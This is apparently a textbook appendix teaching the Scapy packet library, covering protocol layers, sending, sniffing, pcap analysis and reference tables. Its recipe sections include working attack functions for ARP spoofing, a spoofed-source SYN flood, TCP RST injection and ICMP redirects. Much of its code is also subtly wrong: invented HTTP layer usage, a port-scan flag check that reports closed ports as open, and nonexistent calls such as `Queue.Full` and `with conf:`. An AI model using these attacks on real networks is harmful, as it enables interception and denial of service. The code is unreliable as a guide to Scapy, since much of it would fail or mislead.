# Appendix A: Deep Dive - Scapy Protocol Analysis & Packet Crafting

## A.1 Introduction to Scapy

### What is Scapy?

Scapy is a powerful interactive packet manipulation program and library written in Python. Think of it as a Swiss Army knife for network packets—you can forge, decode, send, capture, and analyze network packets with incredible flexibility.

### Why Scapy?

| Feature | Benefit |
|---------|---------|
| **Packet Crafting** | Build any packet from scratch with full control |
| **Protocol Support** | Supports hundreds of protocols (IP, TCP, UDP, ICMP, ARP, DNS, HTTP, etc.) |
| **Sniffing** | Capture live network traffic with BPF filters |
| **Injection** | Send packets at Layer 2 or Layer 3 |
| **Analysis** | Parse and inspect packet contents |
| **Extensible** | Add custom protocols easily |

### Installation

```bash
# Install Scapy
pip install scapy

# On Linux, you may need additional dependencies
sudo apt-get install python3-scapy  # Debian/Ubuntu
sudo dnf install python3-scapy      # Fedora

# For full functionality, install with extras
pip install scapy[complete]
```

---

## A.2 Core Concepts

### Packet Layers

Scapy represents packets as a stack of layers. Think of it like an onion—each layer wraps the one below it.

```
┌─────────────────────────────────┐
│         Ethernet Layer          │
│  ┌───────────────────────────┐  │
│  │         IP Layer          │  │
│  │  ┌─────────────────────┐  │  │
│  │  │       TCP/UDP       │  │  │
│  │  │  ┌───────────────┐  │  │  │
│  │  │  │    Payload    │  │  │  │
│  │  │  └───────────────┘  │  │  │
│  │  └─────────────────────┘  │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
```

### Building Packets

```python
from scapy.all import IP, TCP, Ether

# Build an IP packet
ip = IP(dst="192.168.1.1", ttl=64)

# Build a TCP packet
tcp = TCP(dport=80, flags="S", seq=12345)

# Combine layers
packet = ip / tcp

# Add payload
packet = ip / tcp / b"Hello, World!"

# Build from Ethernet (Layer 2)
eth = Ether(dst="ff:ff:ff:ff:ff:ff", src="00:11:22:33:44:55")
packet = eth / ip / tcp
```

### Packet Display

```python
# Show packet structure
packet.show()
# or
packet.display()

# Summary
packet.summary()

# Hex dump
packet.hexdump()

# ASCII representation
packet.show2()  # Shows calculated fields
```

---

## A.3 Protocol Reference

### Ethernet Layer

```python
from scapy.all import Ether

# Build Ethernet frame
eth = Ether(
    dst="ff:ff:ff:ff:ff:ff",  # Destination MAC
    src="00:11:22:33:44:55",  # Source MAC
    type=0x0800,              # IPv4 (0x0806 for ARP, 0x86DD for IPv6)
)

# Common EtherTypes
ETHERTYPE_IP    = 0x0800  # IPv4
ETHERTYPE_ARP   = 0x0806  # ARP
ETHERTYPE_IPV6  = 0x86DD  # IPv6
ETHERTYPE_VLAN  = 0x8100  # VLAN
```

### IP Layer

```python
from scapy.all import IP

# Build IP packet
ip = IP(
    version=4,              # IPv4
    ihl=5,                  # Header length (5 = 20 bytes)
    tos=0,                  # Type of Service
    len=40,                 # Total length (auto-calculated)
    id=1,                   # Identification
    flags=0,                # Flags (DF, MF)
    frag=0,                 # Fragment offset
    ttl=64,                 # Time To Live
    proto=6,                # Protocol (6=TCP, 17=UDP, 1=ICMP)
    chksum=None,            # Checksum (auto-calculated)
    src="192.168.1.100",    # Source IP
    dst="8.8.8.8",          # Destination IP
)

# IP options
options = [
    IPOption(b'\x01\x01\x02\x03'),  # Some custom option
]
ip.options = options
```

### TCP Layer

```python
from scapy.all import TCP

# Build TCP segment
tcp = TCP(
    sport=12345,            # Source port
    dport=80,               # Destination port
    seq=1000,               # Sequence number
    ack=0,                  # Acknowledgment number
    dataofs=5,              # Data offset (5 = 20 bytes header)
    reserved=0,             # Reserved bits
    flags="S",              # TCP flags
    window=8192,            # Window size
    chksum=None,            # Checksum (auto-calculated)
    urgptr=0,               # Urgent pointer
)

# TCP flags
# "S" = SYN
# "A" = ACK
# "F" = FIN
# "R" = RST
# "P" = PSH
# "U" = URG
# "E" = ECE
# "C" = CWR
# "N" = NS

# Combine flags
flags = "SA"  # SYN-ACK
flags = "PA"  # PSH-ACK
flags = "R"   # RST
```

### UDP Layer

```python
from scapy.all import UDP

# Build UDP datagram
udp = UDP(
    sport=12345,            # Source port
    dport=53,               # Destination port (DNS)
    len=None,               # Length (auto-calculated)
    chksum=None,            # Checksum (auto-calculated)
)
```

### ICMP Layer

```python
from scapy.all import ICMP

# Build ICMP packet
icmp = ICMP(
    type=8,                 # 8 = Echo Request, 0 = Echo Reply
    code=0,                 # Code (0 for echo)
    chksum=None,            # Checksum (auto-calculated)
    id=1,                   # Identifier
    seq=1,                  # Sequence number
)

# ICMP Types
ICMP_ECHO_REPLY   = 0
ICMP_UNREACH      = 3
ICMP_SOURCE_QUENCH = 4
ICMP_REDIRECT     = 5
ICMP_ECHO_REQUEST = 8
ICMP_TIME_EXCEEDED = 11
ICMP_PARAM_PROBLEM = 12
ICMP_TIMESTAMP_REQUEST = 13
ICMP_TIMESTAMP_REPLY = 14

# ICMP Codes (for type 3 - Unreachable)
ICMP_UNREACH_NET        = 0
ICMP_UNREACH_HOST       = 1
ICMP_UNREACH_PROTOCOL   = 2
ICMP_UNREACH_PORT       = 3
ICMP_UNREACH_NEEDFRAG   = 4
ICMP_UNREACH_SRCFAIL    = 5
ICMP_UNREACH_NET_UNKNOWN = 6
ICMP_UNREACH_HOST_UNKNOWN = 7
ICMP_UNREACH_ISOLATED   = 8
ICMP_UNREACH_NET_PROHIB = 9
ICMP_UNREACH_HOST_PROHIB = 10
```

### ARP Layer

```python
from scapy.all import ARP

# Build ARP packet
arp = ARP(
    hwtype=1,               # Hardware type (1 = Ethernet)
    ptype=0x0800,           # Protocol type (IPv4)
    hwlen=6,                # Hardware address length
    plen=4,                 # Protocol address length
    op=1,                   # Operation (1=request, 2=reply)
    hwsrc="00:11:22:33:44:55",  # Source MAC
    psrc="192.168.1.1",    # Source IP
    hwdst="ff:ff:ff:ff:ff:ff",  # Destination MAC
    pdst="192.168.1.100",  # Destination IP
)

# ARP Request (who-has)
arp = ARP(op=1, psrc="192.168.1.1", pdst="192.168.1.100")

# ARP Reply (is-at)
arp = ARP(op=2, psrc="192.168.1.1", hwsrc="00:11:22:33:44:55", pdst="192.168.1.100")
```

### DNS Layer

```python
from scapy.all import DNS, DNSQR, DNSRR

# Build DNS query
dns = DNS(
    id=1234,                # Transaction ID
    qr=0,                   # 0 = query, 1 = response
    opcode=0,               # 0 = standard query
    aa=0,                   # Authoritative Answer
    tc=0,                   # Truncated
    rd=1,                   # Recursion Desired
    ra=0,                   # Recursion Available
    z=0,                    # Reserved
    rcode=0,                # Response code
    qdcount=1,              # Question count
    ancount=0,              # Answer count
    nscount=0,              # Authority count
    arcount=0,              # Additional count
    qd=DNSQR(qname="example.com", qtype=1, qclass=1),  # A record
)

# Build DNS response
dns_response = DNS(
    id=1234,
    qr=1,                   # Response
    rcode=0,
    qdcount=1,
    ancount=1,
    qd=DNSQR(qname="example.com", qtype=1, qclass=1),
    an=DNSRR(
        rrname="example.com",
        type=1,             # A record
        rclass=1,           # IN
        ttl=300,
        rdata="93.184.216.34"
    )
)
```

### HTTP Layer

```python
from scapy.all import HTTP, HTTPRequest, HTTPResponse

# Build HTTP request
http = HTTP(
    Method="GET",
    Path="/index.html",
    Http_Version="HTTP/1.1",
    Accept_Encoding="gzip, deflate",
    Accept_Language="en-US,en;q=0.9",
    Connection="keep-alive",
    Host="example.com",
    User_Agent="Mozilla/5.0",
)

# Packets with HTTP
packet = IP(dst="93.184.216.34") / TCP(dport=80, flags="PA") / HTTP(
    Method="GET",
    Path="/",
    Http_Version="HTTP/1.1",
    Host="example.com"
)
```

---

## A.4 Sending Packets

### Layer 3 (IP) Sending

```python
from scapy.all import send, sr, sr1, srloop

# Send packet without waiting for response
send(packet)

# Send packet and wait for response (1 packet)
response = sr1(packet, timeout=2, verbose=False)

# Send packet and wait for all responses
answered, unanswered = sr(packet, timeout=2, verbose=False)

# Send and loop (for continuous transmission)
srloop(packet, inter=1, count=10, timeout=2)
```

### Layer 2 (Ethernet) Sending

```python
from scapy.all import sendp, srp, srp1

# Send Ethernet frame
sendp(eth_packet, iface="eth0")

# Send and wait for response
answered, unanswered = srp(eth_packet, iface="eth0", timeout=2)

# Send and get first response
response = srp1(eth_packet, iface="eth0", timeout=2)
```

### Examples

```python
# TCP SYN scan
def tcp_scan(target, port):
    packet = IP(dst=target) / TCP(dport=port, flags="S")
    response = sr1(packet, timeout=2, verbose=False)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags & 0x12:  # SYN-ACK
            return "open"
        elif response[TCP].flags & 0x14:  # RST-ACK
            return "closed"
    return "filtered"

# ICMP ping
def ping(target):
    packet = IP(dst=target) / ICMP(type=8, code=0)
    response = sr1(packet, timeout=2, verbose=False)
    
    if response:
        if response.haslayer(ICMP) and response[ICMP].type == 0:
            return response.time - packet.time  # RTT
    return None

# ARP scan
def arp_scan(network):
    packet = ARP(pdst=network)
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / packet,
                      timeout=2, verbose=False)
    
    hosts = []
    for sent, received in answered:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts
```

---

## A.5 Sniffing Packets

### Basic Sniffing

```python
from scapy.all import sniff

# Capture 10 packets
packets = sniff(count=10, iface="eth0")

# Capture for 10 seconds
packets = sniff(timeout=10, iface="eth0")

# Capture with filter
packets = sniff(filter="tcp port 80", count=10)

# Capture indefinitely
sniff(prn=lambda x: x.summary(), iface="eth0")
```

### BPF Filters

```python
# Filter by protocol
filter = "tcp"
filter = "udp"
filter = "icmp"
filter = "arp"

# Filter by port
filter = "tcp port 80"      # HTTP
filter = "tcp port 443"     # HTTPS
filter = "udp port 53"      # DNS
filter = "tcp port 22"      # SSH

# Filter by IP
filter = "host 192.168.1.1"
filter = "src 192.168.1.100"
filter = "dst 8.8.8.8"

# Filter by network
filter = "net 192.168.0.0/16"

# Filter by port range
filter = "tcp portrange 1-1024"

# Combined filters
filter = "tcp port 80 and host 192.168.1.1"
filter = "(tcp port 80 or tcp port 443) and host 192.168.1.1"

# Exclude traffic
filter = "not arp and not icmp"
```

### Advanced Sniffing

```python
from scapy.all import sniff, AsyncSniffer

# With callback
def packet_handler(packet):
    if packet.haslayer(IP):
        print(f"{packet[IP].src} -> {packet[IP].dst}")

sniff(prn=packet_handler, filter="ip", count=10)

# Asynchronous sniffing (non-blocking)
sniffer = AsyncSniffer(
    iface="eth0",
    filter="tcp",
    prn=packet_handler,
    store=False,  # Don't store packets
)

sniffer.start()
# Do other work...
sniffer.stop()

# Save captured packets
packets = sniff(count=100)
wrpcap("capture.pcap", packets)

# Load packets
packets = rdpcap("capture.pcap")
```

---

## A.6 Packet Analysis

### Inspecting Packets

```python
from scapy.all import rdpcap

# Load PCAP
packets = rdpcap("capture.pcap")

# Iterate through packets
for packet in packets:
    # Check for IP layer
    if packet.haslayer(IP):
        ip = packet[IP]
        print(f"IP: {ip.src} -> {ip.dst}")
        
        # Check for TCP
        if packet.haslayer(TCP):
            tcp = packet[TCP]
            print(f"TCP: {tcp.sport} -> {tcp.dport} (Flags: {tcp.flags})")
        
        # Check for UDP
        if packet.haslayer(UDP):
            udp = packet[UDP]
            print(f"UDP: {udp.sport} -> {udp.dport}")

# Get packet length
length = len(packet)

# Get packet time
timestamp = packet.time

# Get raw bytes
raw_bytes = bytes(packet)
```

### Protocol Analysis

```python
from collections import Counter

# Count protocols
protocols = Counter()
for packet in packets:
    if packet.haslayer(IP):
        proto = packet[IP].proto
        if proto == 6:
            protocols['TCP'] += 1
        elif proto == 17:
            protocols['UDP'] += 1
        elif proto == 1:
            protocols['ICMP'] += 1
    elif packet.haslayer(ARP):
        protocols['ARP'] += 1

# Find top talkers
def get_top_talkers(packets, n=10):
    talkers = Counter()
    for packet in packets:
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            talkers[src] += 1
            talkers[dst] += 1
    return talkers.most_common(n)

# Extract HTTP hosts
def get_http_hosts(packets):
    hosts = set()
    for packet in packets:
        if packet.haslayer(HTTP):
            if packet[HTTP].Host:
                hosts.add(packet[HTTP].Host)
    return hosts

# Extract DNS queries
def get_dns_queries(packets):
    queries = []
    for packet in packets:
        if packet.haslayer(DNSQR):
            queries.append(packet[DNSQR].qname.decode())
    return queries
```

### Packet Crafting Functions

```python
# Create TCP SYN packet
def create_tcp_syn(src_ip, dst_ip, src_port, dst_port):
    return IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="S")

# Create HTTP GET packet
def create_http_get(dst_ip, host, path="/"):
    return IP(dst=dst_ip) / TCP(dport=80, flags="PA") / HTTP(
        Method="GET",
        Path=path,
        Http_Version="HTTP/1.1",
        Host=host,
        User_Agent="Mozilla/5.0"
    )

# Create DNS query
def create_dns_query(dst_ip, domain):
    return IP(dst=dst_ip) / UDP(sport=12345, dport=53) / DNS(
        id=1234,
        rd=1,
        qd=DNSQR(qname=domain, qtype=1, qclass=1)
    )

# Create ARP spoof packet
def create_arp_spoof(target_ip, spoof_ip, target_mac=None):
    if target_mac:
        return Ether(dst=target_mac) / ARP(
            op=2,
            psrc=spoof_ip,
            pdst=target_ip,
            hwdst=target_mac
        )
    else:
        return ARP(
            op=2,
            psrc=spoof_ip,
            pdst=target_ip
        )
```

---

## A.7 Performance Optimization

### Memory Management

```python
from scapy.all import sniff

# Don't store packets (memory efficient)
sniff(prn=packet_handler, store=False)

# Limit packet count
sniff(count=1000, store=False)

# Use packet queue
from queue import Queue
packet_queue = Queue(maxsize=1000)

def queue_handler(packet):
    try:
        packet_queue.put_nowait(packet)
    except Queue.Full:
        pass

sniff(prn=queue_handler, store=False)

# Clear packets periodically
while True:
    # Process packets...
    packet_queue.clear()
```

### Speed Optimization

```python
from scapy.all import conf

# Configure for performance
conf.use_pcap = True  # Use libpcap
conf.verb = 0         # Quiet mode

# Disable checksum validation
conf.checkIPaddr = False
conf.checkIPsrc = False

# Use L3RawSocket for faster sending
from scapy.arch.linux import L3RawSocket
conf.L3socket = L3RawSocket

# Sniff with optimized parameters
sniff(
    iface="eth0",
    filter="tcp",
    timeout=10,
    store=False,
    promisc=True,
)
```

---

## A.8 Common Scapy Recipes

### Port Scanning

```python
# TCP SYN scan (stealth)
def syn_scan(target, ports):
    results = {}
    for port in ports:
        packet = IP(dst=target) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=2, verbose=False)
        
        if response and response.haslayer(TCP):
            if response[TCP].flags & 0x12:  # SYN-ACK
                results[port] = "open"
                # Send RST to close connection
                send(IP(dst=target) / TCP(dport=port, flags="R"), verbose=False)
            elif response[TCP].flags & 0x14:  # RST-ACK
                results[port] = "closed"
            else:
                results[port] = "filtered"
        else:
            results[port] = "filtered"
    
    return results

# TCP connect scan (full)
def connect_scan(target, ports):
    import socket
    results = {}
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target, port))
        results[port] = "open" if result == 0 else "closed"
        sock.close()
    return results
```

### ARP Poisoning

```python
# ARP spoofing
def arp_spoof(target_ip, gateway_ip, target_mac=None):
    # Send ARP reply to target
    packet = ARP(
        op=2,
        psrc=gateway_ip,
        pdst=target_ip,
        hwdst=target_mac or "ff:ff:ff:ff:ff:ff"
    )
    send(packet, verbose=False)
    print(f"Sent ARP spoof to {target_ip}: gateway {gateway_ip} is at our MAC")

# Restore ARP
def arp_restore(target_ip, gateway_ip, target_mac, gateway_mac):
    # Send correct ARP replies
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac))
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac))
    print("ARP tables restored")
```

### Packet Injection

```python
# TCP RST injection
def inject_rst(target_ip, target_port, src_ip, src_port, seq):
    packet = IP(src=src_ip, dst=target_ip) / TCP(
        sport=src_port,
        dport=target_port,
        flags="R",
        seq=seq
    )
    send(packet, verbose=False)

# ICMP redirect
def send_icmp_redirect(target_ip, gateway_ip, new_gateway):
    packet = IP(src=gateway_ip, dst=target_ip) / ICMP(
        type=5,  # Redirect
        code=1,  # Redirect for host
    ) / IP(src=target_ip, dst=gateway_ip) / ICMP(type=8, code=0)
    send(packet, verbose=False)

# TCP SYN flood
def syn_flood(target_ip, target_port, count=1000):
    src_ip = "10.0.0.1"  # Spoofed
    for i in range(count):
        packet = IP(src=src_ip, dst=target_ip) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S",
            seq=random.randint(0, 0xFFFFFFFF)
        )
        send(packet, verbose=False)
```

---

## A.9 Error Handling & Best Practices

### Common Errors

```python
from scapy.all import conf

# Permission errors (need root/sudo)
# Run as sudo: sudo python script.py

# Interface not found
conf.iface = "eth0"  # Specify correct interface

# Missing dependencies
try:
    from scapy.all import *
except ImportError:
    print("Scapy not installed: pip install scapy")
    sys.exit(1)

# Handle exceptions
try:
    response = sr1(packet, timeout=2, verbose=False)
except Exception as e:
    print(f"Error: {e}")
```

### Best Practices

```python
# 1. Always use context managers
with conf:
    conf.verb = 0
    # Operations here

# 2. Set timeouts
packet = IP(dst="8.8.8.8") / ICMP()
response = sr1(packet, timeout=2)

# 3. Use store=False for large captures
sniff(prn=handler, store=False)

# 4. Validate packets
if packet.haslayer(IP):
    # Process packet

# 5. Be mindful of permissions
# Check if running as root (Linux)
import os
if os.geteuid() != 0:
    print("Run as root for packet operations")
```

---

## A.10 Scapy vs Other Tools

### Comparison Table

| Feature | Scapy | Wireshark | tcpdump | Nmap |
|---------|-------|-----------|---------|------|
| **Packet Crafting** | Excellent | Limited | No | Limited |
| **Protocol Support** | Extensive | Extensive | Limited | Limited |
| **Sniffing** | Good | Excellent | Excellent | No |
| **Scanning** | Custom | No | No | Excellent |
| **Automation** | Excellent | Limited | Scriptable | Good |
| **Learning Curve** | Steep | Moderate | Low | Moderate |
| **Scripting** | Python | TShark | CLI | Lua |

### When to Use Each

| Tool | Best For |
|------|----------|
| **Scapy** | Custom packet crafting, prototyping, automation |
| **Wireshark** | Deep packet analysis, debugging, visualization |
| **tcpdump** | Quick captures, scripts, low resource usage |
| **Nmap** | Network mapping, port scanning, service detection |

---

## A.11 Advanced Scapy Techniques

### Custom Protocols

```python
from scapy.all import Packet, bind_layers, ByteField, ShortField

class CustomProtocol(Packet):
    name = "Custom Protocol"
    fields_desc = [
        ByteField("version", 1),
        ShortField("type", 0),
        ByteField("flags", 0),
    ]

# Bind to IP protocol
bind_layers(IP, CustomProtocol, proto=200)

# Build packet
packet = IP(dst="192.168.1.1") / CustomProtocol(
    version=2,
    type=123,
    flags=1
)

# Send packet
send(packet)
```

### Fuzzing

```python
from scapy.all import fuzz, send

# Fuzz packets
def fuzz_packet(base_packet):
    return fuzz(base_packet)

# Fuzz TCP packet
base = IP(dst="192.168.1.1") / TCP(dport=80)
fuzzed = fuzz(base)
send(fuzzed)

# Fuzz with constraints
for i in range(100):
    packet = fuzz(IP() / TCP())
    send(packet, verbose=False)
```

### Protocol State Machine

```python
# TCP state machine
class TCPState:
    def __init__(self):
        self.state = "CLOSED"
    
    def process_packet(self, packet):
        if not packet.haslayer(TCP):
            return
        
        flags = packet[TCP].flags
        
        if self.state == "CLOSED":
            if "S" in flags:
                self.state = "SYN_SENT"
                send(IP(dst=packet[IP].src) / TCP(
                    dport=packet[TCP].sport,
                    sport=packet[TCP].dport,
                    flags="SA",
                    seq=packet[TCP].ack,
                    ack=packet[TCP].seq + 1
                ))
                self.state = "SYN_RECEIVED"
```

### Packet Assembly

```python
# Fragment packets
def fragment_packet(packet, mtu=1500):
    fragments = []
    data = bytes(packet)
    
    for offset in range(0, len(data), mtu):
        fragment = data[offset:offset+mtu]
        fragments.append(fragment)
    
    return fragments

# Reassemble packets
def reassemble_packets(fragments):
    return b''.join(fragments)
```

---

## A.12 Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| **Permission denied** | Run as root/sudo |
| **Interface not found** | Check iface name (ip link show) |
| **Missing dependencies** | Install libpcap-dev |
| **Slow performance** | Use store=False, set conf.verb=0 |
| **Packets not received** | Check interface, promiscuous mode |
| **TCP checksum errors** | Disable checksum validation |

### Debugging Commands

```python
# Enable debug output
conf.debug_dissector = True

# Show available interfaces
from scapy.all import get_if_list
print(get_if_list())

# Check interface status
from scapy.all import iface
print(iface)

# Verbose output
send(packet, verbose=True)

# Packet details
packet.show()
packet.show2()  # With calculated fields
```

---

## A.13 Resources & Further Learning

### Official Documentation

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Scapy GitHub Repository](https://github.com/secdev/scapy)
- [Scapy Tutorials](https://scapy.readthedocs.io/en/latest/usage.html)

### Books

- "Scapy: The Network Packet Manipulation Tool" by Philippe Biondi
- "Python Penetration Testing Essentials" by Mohit Raj

### Community

- [Scapy Mailing List](https://mail.secdev.org/mailman/listinfo/scapy)
- [Stack Overflow](https://stackoverflow.com/questions/tagged/scapy)
- [Reddit r/Scapy](https://www.reddit.com/r/scapy/)

### Practice

- Try the [Scapy Challenges](https://github.com/secdev/scapy/tree/master/doc/notebooks)
- Use [Network Simulation](https://www.mininet.org/) with Scapy
- Analyze [PCAP files](https://www.malware-traffic-analysis.net/)

---

## A.14 Quick Reference Card

### Common Commands

```bash
# Import
from scapy.all import *

# Build
packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")

# Send
send(packet)              # Layer 3
sendp(packet, iface="eth0")  # Layer 2

# Send and Receive
response = sr1(packet, timeout=2)
answered, unanswered = sr(packet, timeout=2)

# Sniff
packets = sniff(count=10, iface="eth0")
sniff(prn=lambda x: x.summary(), store=False)

# PCAP
wrpcap("file.pcap", packets)
packets = rdpcap("file.pcap")

# Show
packet.show()
packet.summary()
packet.hexdump()
```

### Common Protocols

```python
Ether(dst="ff:ff:ff:ff:ff:ff")
IP(dst="192.168.1.1", ttl=64)
TCP(sport=12345, dport=80, flags="S")
UDP(sport=12345, dport=53)
ICMP(type=8, code=0)  # Echo Request
ARP(op=1, psrc="192.168.1.1", pdst="192.168.1.100")
DNS(qd=DNSQR(qname="example.com"))
HTTP(Method="GET", Path="/")
```

---

```
[COMPLETED: Appendix A - Scapy Deep Dive]
